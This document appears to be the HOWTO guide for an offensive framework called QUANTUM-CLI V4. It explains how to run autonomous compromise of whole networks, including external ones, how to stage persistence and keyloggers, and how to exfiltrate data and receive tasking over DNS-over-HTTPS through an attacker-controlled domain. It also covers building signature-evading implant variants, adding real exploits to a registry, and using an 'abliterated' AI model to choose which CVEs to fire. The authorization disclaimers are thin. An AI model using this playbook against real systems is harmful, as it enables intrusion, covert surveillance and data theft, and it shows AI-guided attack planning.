# QUANTUM-CLI V4 — HOWTOs

In-depth task recipes. All of them assume an **authorized engagement** with a defined scope.

---

## HOWTO 1 — Run fully autonomous

**Goal:** the whole engagement (cameras → recon → exploits → post-exploit → harvest → seal →
MITRE map) with no operator input.

```bash
pip install flask requests waitress pycryptodome impacket pysmb colorama
python quantum_cli.py
```

That's it. No arguments = `AutonomousOverlord` on the autodetected local `/24`:

1. Keys are generated if missing; the waitress C2 starts on `:8443` in the background.
2. **Phase 1 — camera sweep** (`CAMWAR.pwn_network(scope)`) runs before any service scan. This
   ordering is a standing rule; do not "optimize" it away.
3. The decision loop starts (`decide()` → `_execute()`): camera actions, recon, validator-gated
   exploitation, brute/phish, worm hops, harvest — with `network_aware_jitter` rests, checking
   the kill-switch every cycle.
4. On interrupt or kill-switch: footprint wipe (if engaged), `GRAYFISH.seal_dir()`,
   `MitreMapper().map_audit()`, summary line (`cameras touched / fired / creds`).

Tune it:

```bash
python quantum_cli.py -c 10.0.0.0/24 --aggression aggressive   # scope + force exploits
python quantum_cli.py --cycles 5                              # stop after 5 cycles
python quantum_cli.py --camera-only                            # camera-only contract
python quantum_cli.py --no-ai                                  # deterministic QBrain path
```

Monitor from `http://<your-ip>:8443/dash`. Stop safely with `Ctrl-C` (seals loot first).

---

## HOWTO 2 — Target an external network

**Goal:** point the framework at a **different, separately authorized** network (not the local /24).

```bash
# CIDR — autonomous camera war on that network by default
python quantum_cli.py --target 203.0.113.0/24

# Bare IP — automatically expanded to its /24 (203.0.113.7 -> 203.0.113.0/24)
python quantum_cli.py --target 203.0.113.7

# Manual instead of autonomous
python quantum_cli.py --target 203.0.113.0/24 --manual    # opens the camera console
```

Behind the scenes (`__main__.py`): a `--target` with a `/` is used as-is; a bare IPv4 becomes
`<a.b.c>.0/24`; anything else is passed through. Without `--manual` the target goes straight to
`AutonomousOverlord(scope=cidr, ...)` — the external network gets the full camera-first loop.
Confirm the external network is inside your authorized scope before every run.

---

## HOWTO 3 — Use the chat / AI

**Goal:** free-form AI queries and AI-guided planning.

1. Put your key in `.env` (repo root):
   ```
   ABLITERATION_KEY=sk-...
   ```
   Optional: `QCLI_PINNED_MODEL=<model-id>` to pin a model (or use the `--model` flag once).
2. **Chat:** menu → `23` (Query AI), type any prompt. If the AI is unavailable the console prints
   `[AI unavailable — QBrain mode active]` — everything still works deterministically.
3. **Via the C2** (e.g. from your phone): `POST /ai` with `{"cmd": "<prompt>", "params": {...}}`.
4. **Planning:** every `auto`/menu-6 exploit asks the AI for exactly one CVE id from the registry;
   the answer is verified against `ZERO_DAY_REGISTRY` before firing, with QBrain as fallback.
5. **Deploy a local model:** `python quantum_cli.py deployai` (or menu 27) — downloads/registers
   a local model into `models/` and prints its id.
6. **Deterministic mode:** `--no-ai` sets `QCLI_NO_AI=1` and marks the supervisor dead — zero AI
   prompts, zero model downloads, zero AI network calls; QBrain plans everything.

Billing note: an HTTP `402`/`429` from the provider trips "credits/rate" — the run continues on
QBrain; check your Abliterated.ai credits.

---

## HOWTO 4 — Stage persistence

**Goal:** leave a controlled foothold on an authorized host.

```bash
# 1. Compromise / control the host (e.g. auto-exploit)
python quantum_cli.py auto -t 10.0.0.42

# 2. Stage persistence (PERSISTX)
python quantum_cli.py persist
```

What happens:

- `auto` success triggers `post_exploit_auto()` automatically — `persistx()` and keylogger
  staging run right after a hit, and a keylogger-buffer pull task is queued for every fired target.
- `persist` (or the queued tasks) stage the foothold; tasks are delivered **on the implant's next
  beacon** to `POST /r` — pull-only by design.
- The keylogger writes `*.klq` buffers which the queued task pulls and the C2 seals into
  `loot/<host>/`.
- Related: `MFP` engine persistence (`mfp` command), worm hops (`worm -t`, menu 15), and
  per-target OBSIDIAN variants (HOWTO 6).

Retire cleanly with the kill-switch (menu 30 / `POST /kill` — wipe-first) and
`python quantum_cli.py wipe` for footprint cleanup.

---

## HOWTO 5 — Exfil via DoH (GHOSTFANG-DNS)

**Goal:** egress data from a host that allows **no inbound ports** and only standard web/DNS
outbound (443/tcp to public resolvers).

1. **Own a domain** (`yourdomain.tld`) whose DNS you control.
2. **Generate the agent:**
   ```bash
   python quantum_cli.py ghostdns --domain yourdomain.tld
   # -> writes qcli/ghostdns.sh and prints {"agent": ..., "task_check": ...}
   ```
   (Or set `QCLI_DOMAIN=yourdomain.tld` in `.env` and run `ghostdns` bare.)
3. **Run `qcli/ghostdns.sh` on the target host.** It beacons every 60 s (default interval):
   - beacon data rides as **base32 subdomain labels** (`<host_id>.<chunk>.yourdomain.tld`)
     resolved through cloudflare-dns.com / dns.google — pure 443/tcp, looks like a cache miss.
4. **Task the implant:** publish a DNS **TXT record** at `cmd.yourdomain.tld` (or
   `<host_id>.cmd.yourdomain.tld`) containing a JSON task, e.g. `{"cmd": "id > /tmp/o"}`.
   Special TXT values: `wipe` (remove artifacts) and `kill` (self-terminate).
5. **HQ-side check:** `doh_task_check("yourdomain.tld")` (printed by the `ghostdns` command)
   reads the current task exactly the way the implant does.
6. **Collect** on your authoritative DNS / web capture point; or run the direct beacon server:
   ```bash
   python quantum_cli.py dohc2    # DoHC2BeaconServer on :5353
   ```
   Programmatic beacon from Python: `doh_reverse_beacon(host_id, data, domain)`.

---

## HOWTO 6 — Build variants

**Goal:** generate per-target implant stager variants so no two compiled agents share a signature.

```bash
python agents/build/variant.py --target 10.0.0.5 --epoch 7
# -> agents/build/out/obsidian_10.0.0.5_e7_<tag>.ps1
```

- **Determinism contract:** all randomness is seeded from `random.Random(f"{target}:{epoch}")` —
  the same `(target, epoch)` pair is **byte-identical** every build; any change to either value
  produces a **bytewise different** agent.
- **Per-variant transformations:** junk comment injection (3–12 lines between statements),
  shuffled independent preamble statements, renamed local variables (`$buf` → `$buf_3f9a`).
- **No** network calls, no hardcoded keys, no global RNG state — the builder is safe to run
  anywhere.
- Flags: `--epoch N` (variant epoch, default 0), `--c2 <url>` (default `http://127.0.0.1:8443/r`),
  `--out-dir` (default `agents/build/out`).
- Importable: `from agents.build.variant import build_variant; path = build_variant("10.0.0.5", epoch=7)`.
- The generated stager runs a beacon loop against the C2 `/r` endpoint: host/act heartbeat plus
  execution of any task command pulled from the response.
- Tests: `pytest tests/test_variant.py` proves both determinism properties.

---

## HOWTO 7 — Add a new weapon to the registry

**Goal:** teach the framework a new CVE while keeping the fire contract intact.

1. **Implement the weapon** in the tier module that fits (`src/quantum/weapons/remote_v3.py` for
   network services, `kernel_v3.py` for Linux LPE, `media_v3.py` for client/media,
   `legacy.py` for Windows classics):
   ```python
   def v3_mything(ip, params=None):
       # real, functional technique — no simulated code
       ...
       return {"cve": "CVE-YYYY-NNNNN", "status": "ok", "evidence": ...}
   ```
2. **Register it** in `ZERO_DAY_REGISTRY` (`src/quantum/weapons/registry.py`) — entries reference
   weapons **by name**; resolution happens at fire time via `resolve_weapon()` (searched across
   the tier modules), so tiers stay lazy-importable:
   ```python
   "CVE-YYYY-NNNNN": {"name": "MyThing", "tier": "V3_HIGH", "weapon": "v3_mything"},
   ```
3. **Export it** from `src/quantum/__init__.py` (`__all__`) if operators should import it directly.
4. **Test it** — extend `tests/test_registry.py` with your CVE: `assert "CVE-YYYY-NNNNN" in
   registry`; fire it against your lab target and check it never raises (`registry.fire` wraps
   every weapon).
5. From now on the orchestrator can plan it (`ExploitOrchestrator.auto_exploit`), and
   `registry.fire("CVE-YYYY-NNNNN", ip)` works from the menu/`auto` path.

Rules of the road: the weapon must be real and functional (no simulated code), must fit the
tier naming (`v3_*` / `check_*`), and must return a dict. If the single-file spec
(`dist/quantum-cli-v3.1-single.py` — THE SPEC) already has the technique, match its behavior
exactly.

---

## HOWTO 8 — Read mitre_map.json

**Goal:** turn the engagement audit trail into ATT&CK coverage for the report.

1. **Regenerate:**
   ```bash
   python quantum_cli.py mitre     # or let the Overlord do it on exit/pause
   ```
2. **Open `logs/mitre_map.json`:**
   ```json
   {
     "generated": "2026-09-26T10:11:12Z",
     "coverage": ["T1005", "T1056.001", "T1071.004", "..."],
     "counts":   {"T1005": 12, "T1056.001": 3, "...": 0},
     "events_scanned": 2000
   }
   ```
   - **`coverage`** — sorted list of ATT&CK technique IDs observed in this engagement.
   - **`counts`** — how many audit events matched each technique (evidence weight for the report).
   - **`events_scanned`** — the audit window (last 2000 events of `logs/audit.jsonl`).
3. **Where matches come from:** `MitreMapper.RULES` maps audit keywords to technique IDs
   (e.g. `ghostdns`/`doh` → T1071.004 DNS, `keylogger` → T1056.001, `persistx` → T1547,
   `killswitch`/`wipe` → T1485, `camwar` → T1595.002). See WIKI §3 for the full table.
4. **Report it:** pair `coverage` with `logs/audit.jsonl` (timestamped evidence) and the sealed
   loot inventory. The dash's MITRE panel reads the same data live via `/dash/api/state`.

---

## See also

- [WIKI.md](WIKI.md) — architecture, module map, C2 REST API reference, glossary.
- [OPERATOR_MANUAL.md](OPERATOR_MANUAL.md) — runbook, menu walkthrough, emergency procedures.
- [TROUBLESHOOTING.md](TROUBLESHOOTING.md) — symptom → fix table.
